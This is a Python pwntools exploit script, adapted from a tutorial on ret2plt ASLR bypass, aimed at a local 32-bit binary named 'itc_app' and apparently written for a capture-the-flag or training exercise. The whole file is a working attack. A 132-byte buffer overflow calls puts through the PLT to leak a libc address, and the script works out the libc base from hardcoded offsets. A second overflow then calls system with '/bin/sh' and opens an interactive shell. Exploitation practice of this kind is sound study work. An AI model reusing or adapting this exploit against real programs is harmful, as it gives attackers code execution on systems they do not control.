#Adapted from https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass#final-exploit

from pwn import *

elf = context.binary = ELF('./itc_app')
proc = process()


payload = (b'A' * 132 +
    struct.pack("I", 0x8048340) + # puts PLT
    struct.pack("I", 0x804847b) + # main address
    struct.pack("I", 0x80497ac)  # puts GOT
)

proc.sendline(payload)

welcome = False
for i in range(10):
    line = proc.recvline()
    if welcome and b"Welcome" in line:
        leakedAddr= int.from_bytes(prevLine[:4], byteorder='little')
        print("\033[32m"+"Leaked puts' libc Addr: "+"\033[0m"+"\033[36m"+hex(leakedAddr)+"\033[0m")

        libc_address = leakedAddr - 0x731b0 # libc puts offset

        print("\033[32m"+"Libc base Addr: "+"\033[0m"+"\033[36m"+hex(libc_address)+"\033[0m")
        break
    if b"Welcome" in line:
        welcome = True
    prevLine = line
    try:
        print(line)
    except EOFError:
        break

payload = (
    b'A' * 132 +
    struct.pack("I",libc_address+0x4c830) + # libc system offset
    struct.pack("I",libc_address+0x3c130) + # libc exit offset
    struct.pack("I",libc_address+0x1b5fc8)  # libc /bin/sh offset
)

proc.sendline(payload)

proc.interactive()
